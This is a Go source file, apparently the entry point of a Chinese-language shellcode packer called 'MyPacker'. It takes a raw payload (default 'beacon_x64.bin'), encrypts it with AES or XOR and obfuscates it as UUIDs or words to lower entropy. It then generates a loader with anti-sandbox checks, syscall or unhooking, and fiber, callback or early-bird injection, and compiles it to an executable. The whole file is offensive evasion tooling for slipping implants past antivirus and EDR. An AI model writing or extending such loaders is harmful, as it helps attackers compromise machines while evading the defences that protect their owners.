package main

import (
	"MyPacker/Converters"
	"MyPacker/Encrypt"
	"MyPacker/Loader"
	"MyPacker/Others"
	"flag"
	"fmt"
	"os"
)

func Options() *Others.FlagOptions {
	help := flag.Bool("h", false, "使用帮助")
	inputFile := flag.String("i", "beacon_x64.bin", "原始格式 Shellcode 的路径")
	encryption := flag.String("enc", "aes", "Shellcode加密方式 (例如, aes, xor)")
	language := flag.String("lang", "c", "加载器的语言")
	outFile := flag.String("o", "bea", "输出文件")
	keyLength := flag.Int("k", 16, "加密的密钥长度")
	obfuscation := flag.String("obf", "uuid", "混淆 Shellcode 以降低熵值 (i.e.,uuid,words)")
	framework := flag.Int("f", 64, "选择32位还是64位")
	sandbox := flag.Bool("sandbox", true, "是否开启反沙箱模式")
	unhook := flag.Bool("unhook", false, "是否使用unhook模式(默认使用syscall)")
	loadingTechnique := flag.String("loading", "fiber", "请选择加载方式，支持callback,fiber,earlybird")
	flag.Parse()

	return &Others.FlagOptions{Help: *help, OutFile: *outFile, InputFile: *inputFile, Language: *language, Encryption: *encryption, KeyLength: *keyLength, Obfuscation: *obfuscation, Framework: *framework, Sandbox: *sandbox, Unhook: *unhook, Loading: *loadingTechnique}
}

func main() {
	options := Options()
	if options.Help == true {
		Others.PrintUsage()
		os.Exit(0)
	}
	if options.InputFile == "" || (options.Framework != 32 && options.Framework != 64) || (options.Encryption != "aes" && options.Encryption != "xor") || (options.Obfuscation != "uuid" && options.Obfuscation != "words") || (options.Loading != "fiber" && options.Loading != "callback" && options.Loading != "earlybird") {
		Others.PrintUsage()
		os.Exit(0)
	}
	fmt.Println("开始为您打包exe\n")
	//获取原始shellcode用于加密
	shellcodeBytes := Converters.OriginalShellcode(options.InputFile)
	//获得16进制的shellcode
	hexShellcode := Converters.ShellcodeToHex(string(shellcodeBytes))
	//获得模板格式的shellcode
	formattedHexShellcode := Converters.FormattedHexShellcode(hexShellcode)
	fmt.Println("原始shellcode:" + formattedHexShellcode + "\n")
	//进行加密操作
	hexEncryptShellcode, Key, iv := Encrypt.Encryption(shellcodeBytes, options.Encryption, options.KeyLength)
	fmt.Println("进行加密后的shellcode：" + Converters.FormattedHexShellcode(hexEncryptShellcode) + "\n")
	//进行混淆操作
	var (
		uuidStrings string
		words       string
		dataset     string
	)
	if options.Obfuscation != "" {
		uuidStrings, words, dataset = Encrypt.Obfuscation(options.Obfuscation, hexEncryptShellcode)
	}

	//生成模板并写到文件中 把所有需要的都传过去
	outfile := Loader.GenerateAndWriteTemplateToFile(options, hexEncryptShellcode, Key, iv, uuidStrings, words, dataset)
	//编译
	Others.Build(options, outfile, options.Framework)
}
